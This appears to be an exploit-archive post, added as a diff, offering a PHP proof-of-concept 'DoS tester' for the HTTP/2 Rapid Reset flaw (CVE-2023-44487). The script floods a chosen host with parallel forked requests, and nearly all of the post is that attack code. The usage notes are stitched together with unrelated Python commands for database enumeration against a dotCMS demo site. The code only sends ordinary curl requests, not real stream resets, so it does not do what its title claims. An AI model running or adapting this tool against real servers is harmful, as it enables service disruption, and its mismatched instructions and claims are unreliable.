@@ -1,0 +1,515 @@
+=============================================================================================================================================
+| # Title     : HTTP/2 Rapid Reset DoS Tester                                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://http2.github.io                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211124/ & 	CVE-2023-44487
+
+[+] Summary :  This enhanced tool provides a comprehensive method for testing CVE-2023-44487 with cross-system compatibility, improved user interface, and detailed reporting capabilities.
+
+
+[+]  Usage :   * : Save as: poc.php
+                   Run    : php poc.php 127.0.0.1
+				   
+                   Run    : php poc.php 127.0.0.1 --port=8000 --http1
+				   
+
+python3 poc.py -t https://demo.dotcms.com --full
+
+# Database Enumeration Only
+python3 poc.py -t https://demo.dotcms.com --database
+
+# Quick Scan
+python3 poc.py -t https://demo.dotcms.com --quick
+	
+[+]  POC :	
+
+  <?php
+/*
+indoushka
+*/
+
+if ($argc < 2) {
+    echo "Usage: php poc.php <host> [options]\n";
+    echo "Options:\n";
+    echo "  --port=<port>              Target port (default: 443)\n";
+    echo "  --streams=<count>          Number of streams (default: 200)\n";
+    echo "  --threads=<count>          Number of threads (default: 5)\n";
+    echo "  --delay=<microseconds>     Delay between requests (default: 2000)\n";
+    echo "  --proxy=<proxy_url>        Use proxy (e.g., http://127.0.0.1:8080)\n";
+    echo "  --timeout=<seconds>        Request timeout (default: 5)\n";
+    echo "  --http1                    Force HTTP/1.1\n";
+    echo "  --check-only               Check server support only\n";
+    echo "  --output=<file>            Save results to file\n";
+    echo "  --no-color                 Disable colored output\n";
+    exit;
+}
+
+// Parse command line arguments
+$options = [
+    'host' => $argv[1],
+    'port' => 443,
+    'streams' => 200,
+    'threads' => 5,
+    'delay' => 2000,
+    'timeout' => 5,
+    'proxy' => null,
+    'force_http1' => false,
+    'check_only' => false,
+    'output' => null,
+    'no_color' => false
+];
+
+for ($i = 2; $i < $argc; $i++) {
+    if (strpos($argv[$i], '--') === 0) {
+        $parts = explode('=', $argv[$i], 2);
+        $key = substr($parts[0], 2);
+        
+        if (isset($options[$key])) {
+            $options[$key] = isset($parts[1]) ? $parts[1] : true;
+        } elseif ($key === 'http1') {
+            $options['force_http1'] = true;
+        } elseif ($key === 'check-only') {
+            $options['check_only'] = true;
+        } elseif ($key === 'no-color') {
+            $options['no_color'] = true;
+        }
+    }
+}
+
+// Convert numeric options
+$options['port'] = (int)$options['port'];
+$options['streams'] = (int)$options['streams'];
+$options['threads'] = min((int)$options['threads'], 20); // Limit threads for Windows
+$options['delay'] = (int)$options['delay'];
+$options['timeout'] = (int)$options['timeout'];
+
+// Color support for Windows
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && !$options['no_color']) {
+    // Enable ANSI colors in Windows 10+
+    if (function_exists('sapi_windows_vt100_support')) {
+        sapi_windows_vt100_support(STDOUT, true);
+    }
+}
+
+// ANSI color codes
+$colors = [
+    'red' => "\033[31m",
+    'green' => "\033[32m",
+    'yellow' => "\033[33m",
+    'blue' => "\033[34m",
+    'magenta' => "\033[35m",
+    'cyan' => "\033[36m",
+    'reset' => "\033[0m"
+];
+
+if ($options['no_color']) {
+    $colors = array_fill_keys(array_keys($colors), '');
+}
+
+// Display banner
+echo $colors['cyan'] . "========================================\n";
+echo "      HTTP/2 Rapid Reset DoS Tester \n";
+echo "              by indoushka\n";
+echo "========================================\n" . $colors['reset'];
+
+echo "\nTarget: " . $colors['yellow'] . $options['host'] . ":" . $options['port'] . $colors['reset'] . "\n";
+echo "Protocol: " . ($options['force_http1'] ? "HTTP/1.1" : "HTTP/2 with fallback") . "\n";
+echo "Streams: " . $options['streams'] . "\n";
+echo "Threads: " . $options['threads'] . "\n";
+echo "Delay: " . $options['delay'] . "µs\n";
+if ($options['proxy']) {
+    echo "Proxy: " . $options['proxy'] . "\n";
+}
+echo "\n";
+
+class HTTPTester {
+    private $options;
+    private $colors;
+    private $results = [];
+    private $lockFile;
+    private $isWindows;
+    
+    public function __construct($options, $colors) {
+        $this->options = $options;
+        $this->colors = $colors;
+        $this->isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+        $this->lockFile = sys_get_temp_dir() . '/http2_tester_lock_' . getmypid();
+    }
+    
+    private function log($message, $type = 'info') {
+        $prefix = '';
+        switch ($type) {
+            case 'success':
+                $prefix = $this->colors['green'] . '[+] ';
+                break;
+            case 'error':
+                $prefix = $this->colors['red'] . '[-] ';
+                break;
+            case 'warning':
+                $prefix = $this->colors['yellow'] . '[!] ';
+                break;
+            case 'info':
+                $prefix = $this->colors['blue'] . '[*] ';
+                break;
+        }
+        
+        echo $prefix . $message . $this->colors['reset'] . "\n";
+    }
+    
+    public function checkServerSupport() {
+        $this->log("Checking server support...", 'info');
+        
+        $tests = [
+            'HTTP/2' => CURL_HTTP_VERSION_2_0,
+            'HTTP/1.1' => CURL_HTTP_VERSION_1_1
+        ];
+        
+        $supported = [];
+        foreach ($tests as $name => $version) {
+            if ($this->testProtocol($version)) {
+                $supported[] = $name;
+                $this->log("$name supported", 'success');
+            } else {
+                $this->log("$name not supported", 'error');
+            }
+        }
+        
+        return $supported;
+    }
+    
+    private function testProtocol($version) {
+        $curl = curl_init();
+        $scheme = $this->options['port'] == 443 ? "https" : "http";
+        $url = "{$scheme}://{$this->options['host']}:{$this->options['port']}/";
+        
+        curl_setopt_array($curl, [
+            CURLOPT_URL => $url,
+            CURLOPT_HTTP_VERSION => $version,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 3,
+            CURLOPT_NOBODY => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'HTTP/2-Tester/1.0',
+        ]);
+        
+        if ($this->options['proxy']) {
+            curl_setopt($curl, CURLOPT_PROXY, $this->options['proxy']);
+            curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, true);
+        }
+        
+        $result = curl_exec($curl);
+        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+        $effectiveVersion = curl_getinfo($curl, CURLINFO_HTTP_VERSION);
+        
+        curl_close($curl);
+        
+        return $httpCode > 0;
+    }
+    
+    private function createCurlHandle($streamId, $isReset = false) {
+        $scheme = $this->options['port'] == 443 ? "https" : "http";
+        $url = "{$scheme}://{$this->options['host']}:{$this->options['port']}/";
+        
+        $curl = curl_init($url);
+        
+        $options = [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $isReset ? 1 : $this->options['timeout'],
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'HTTP/2-Tester/1.0',
+            CURLOPT_HTTPHEADER => [
+                'Accept: */*',
+                'X-Stream-ID: ' . $streamId
+            ]
+        ];
+        
+        // Set HTTP version
+        if ($this->options['force_http1']) {
+            $options[CURLOPT_HTTP_VERSION] = CURL_HTTP_VERSION_1_1;
+        } else {
+            $options[CURLOPT_HTTP_VERSION] = CURL_HTTP_VERSION_2_0;
+        }
+        
+        if ($isReset) {
+            $options[CURLOPT_POST] = true;
+            $options[CURLOPT_POSTFIELDS] = 'reset=' . $streamId;
+            $options[CURLOPT_TIMEOUT_MS] = 100;
+        } else {
+            $options[CURLOPT_NOBODY] = true;
+        }
+        
+        if ($this->options['proxy']) {
+            $options[CURLOPT_PROXY] = $this->options['proxy'];
+            $options[CURLOPT_HTTPPROXYTUNNEL] = true;
+        }
+        
+        curl_setopt_array($curl, $options);
+        
+        return $curl;
+    }
+    
+    public function processBatch($start, $end, $type = 'create') {
+        $batchResults = [];
+        
+        for ($i = $start; $i < $end; $i++) {
+            $streamId = ($i * 2) + 1;
+            
+            if ($type === 'create') {
+                $result = $this->createStream($streamId);
+            } else {
+                $result = $this->resetStream($streamId);
+            }
+            
+            $batchResults[] = $result;
+            
+            if ($this->options['delay'] > 0) {
+                usleep($this->options['delay']);
+            }
+        }
+        
+        // Save batch results to temporary file
+        $tempFile = $this->lockFile . '_batch_' . $type . '_' . getmypid() . '.json';
+        file_put_contents($tempFile, json_encode($batchResults));
+        
+        return $tempFile;
+    }
+    
+    private function createStream($streamId) {
+        $curl = $this->createCurlHandle($streamId, false);
+        
+        $start = microtime(true);
+        $result = curl_exec($curl);
+        $end = microtime(true);
+        
+        if ($result === false) {
+            $error = curl_error($curl);
+            $success = false;
+        } else {
+            $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+            $success = ($httpCode >= 200 && $httpCode < 500);
+        }
+        
+        curl_close($curl);
+        
+        return [
+            'stream_id' => $streamId,
+            'type' => 'create',
+            'success' => $success,
+            'time' => round(($end - $start) * 1000, 2),
+            'error' => $error ?? null
+        ];
+    }
+    
+    private function resetStream($streamId) {
+        $curl = $this->createCurlHandle($streamId, true);
+        
+        $start = microtime(true);
+        curl_exec($curl);
+        curl_close($curl);
+        $end = microtime(true);
+        
+        return [
+            'stream_id' => $streamId,
+            'type' => 'reset',
+            'time' => round(($end - $start) * 1000, 2)
+        ];
+    }
+    
+    private function runParallel($operation) {
+        $streamsPerThread = ceil($this->options['streams'] / $this->options['threads']);
+        $tempFiles = [];
+        
+        // Create batch processes
+        for ($t = 0; $t < $this->options['threads']; $t++) {
+            $start = $t * $streamsPerThread;
+            $end = min($start + $streamsPerThread, $this->options['streams']);
+            
+            if ($start >= $end) continue;
+            
+            // On Windows, we use sequential processing in threads
+            if ($this->isWindows) {
+                $tempFile = $this->processBatch($start, $end, $operation);
+                $tempFiles[] = $tempFile;
+            } else {
+                // Fork for Linux/Mac
+                $pid = pcntl_fork();
+                
+                if ($pid == -1) {
+                    die("Could not fork process\n");
+                } elseif ($pid) {
+                    // Parent process
+                    $tempFiles[] = $this->lockFile . '_' . $pid . '.json';
+                } else {
+                    // Child process
+                    $batchResults = [];
+                    for ($i = $start; $i < $end; $i++) {
+                        $streamId = ($i * 2) + 1;
+                        
+                        if ($operation === 'create') {
+                            $result = $this->createStream($streamId);
+                        } else {
+                            $result = $this->resetStream($streamId);
+                        }
+                        
+                        $batchResults[] = $result;
+                        
+                        if ($this->options['delay'] > 0) {
+                            usleep($this->options['delay'] / ($operation === 'reset' ? 10 : 1));
+                        }
+                    }
+                    
+                    $tempFile = $this->lockFile . '_' . getmypid() . '.json';
+                    file_put_contents($tempFile, json_encode($batchResults));
+                    exit(0);
+                }
+            }
+        }
+        
+        // Wait for child processes (Linux/Mac only)
+        if (!$this->isWindows) {
+            while (pcntl_waitpid(0, $status) != -1) {
+                $status = pcntl_wexitstatus($status);
+            }
+        }
+        
+        // Collect results from all temp files
+        $allResults = [];
+        foreach ($tempFiles as $tempFile) {
+            if (file_exists($tempFile)) {
+                $content = file_get_contents($tempFile);
+                $batchResults = json_decode($content, true);
+                $allResults = array_merge($allResults, $batchResults);
+                unlink($tempFile);
+            }
+        }
+        
+        // Merge with main results
+        $this->results = array_merge($this->results, $allResults);
+        
+        return count($allResults);
+    }
+    
+    public function runTest() {
+        $this->log("Starting test...", 'info');
+        
+        // Create streams
+        $this->log("Creating " . $this->options['streams'] . " streams...", 'info');
+        $created = $this->runParallel('create');
+        $this->log("Created " . $created . " streams", 'success');
+        
+        // Reset streams
+        $this->log("Resetting streams...", 'info');
+        $reset = $this->runParallel('reset');
+        $this->log("Reset " . $reset . " streams", 'success');
+        
+        return $this->generateReport();
+    }
+    
+    private function generateReport() {
+        $successful = 0;
+        $failed = 0;
+        $resetCount = 0;
+        $totalCreateTime = 0;
+        $totalResetTime = 0;
+        
+        foreach ($this->results as $result) {
+            if ($result['type'] === 'reset') {
+                $resetCount++;
+                $totalResetTime += $result['time'];
+            } elseif ($result['type'] === 'create') {
+                if ($result['success']) {
+                    $successful++;
+                } else {
+                    $failed++;
+                }
+                $totalCreateTime += $result['time'];
+            }
+        }
+        
+        $report = [
+            'total_operations' => count($this->results),
+            'successful_creations' => $successful,
+            'failed_creations' => $failed,
+            'reset_operations' => $resetCount,
+            'avg_create_time' => $successful > 0 ? round($totalCreateTime / $successful, 2) : 0,
+            'avg_reset_time' => $resetCount > 0 ? round($totalResetTime / $resetCount, 2) : 0,
+            'success_rate' => ($successful + $failed) > 0 ? round(($successful / ($successful + $failed)) * 100, 2) : 0
+        ];
+        
+        return $report;
+    }
+    
+    public function saveResults($filename) {
+        $data = [
+            'options' => $this->options,
+            'results' => $this->results,
+            'timestamp' => date('Y-m-d H:i:s'),
+            'report' => $this->generateReport()
+        ];
+        
+        file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
+        $this->log("Results saved to: $filename", 'success');
+    }
+}
+
+// Main execution
+try {
+    $tester = new HTTPTester($options, $colors);
+    
+    // Check server support if not forcing HTTP/1.1
+    if (!$options['force_http1'] && !$options['check_only']) {
+        $supported = $tester->checkServerSupport();
+        if (!in_array('HTTP/2', $supported) && !$options['force_http1']) {
+            $tester->log("HTTP/2 not supported, falling back to HTTP/1.1", 'warning');
+            $options['force_http1'] = true;
+        }
+    }
+    
+    if ($options['check_only']) {
+        exit;
+    }
+    
+    $report = $tester->runTest();
+    
+    echo "\n" . $colors['cyan'] . "========================================\n";
+    echo "TEST REPORT\n";
+    echo "========================================\n" . $colors['reset'];
+    
+    echo "Total operations: " . $colors['yellow'] . $report['total_operations'] . $colors['reset'] . "\n";
+    echo "Streams created: " . $colors['green'] . $report['successful_creations'] . $colors['reset'];
+    if ($report['failed_creations'] > 0) {
+        echo " (" . $colors['red'] . $report['failed_creations'] . " failed" . $colors['reset'] . ")";
+    }
+    echo "\n";
+    echo "Reset operations: " . $colors['yellow'] . $report['reset_operations'] . $colors['reset'] . "\n";
+    echo "Average create time: " . $report['avg_create_time'] . "ms\n";
+    echo "Average reset time: " . $report['avg_reset_time'] . "ms\n";
+    echo "Success rate: " . 
+        ($report['success_rate'] > 80 ? $colors['green'] : 
+         ($report['success_rate'] > 50 ? $colors['yellow'] : $colors['red'])) . 
+        $report['success_rate'] . "%" . $colors['reset'] . "\n";
+    
+    echo $colors['cyan'] . "========================================\n" . $colors['reset'];
+    
+    if ($options['output']) {
+        $tester->saveResults($options['output']);
+    }
+    
+    echo "\n" . $colors['green'] . "[+] Done! Check server responsiveness.\n" . $colors['reset'];
+    echo $colors['yellow'] . "Note: This tool is for educational and testing purposes only.\n";
+    echo "Use only on systems you own or have permission to test.\n" . $colors['reset'];
+    
+} catch (Exception $e) {
+    echo $colors['red'] . "\n[!] Error: " . $e->getMessage() . "\n" . $colors['reset'];
+    exit(1);
+}
+?>
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
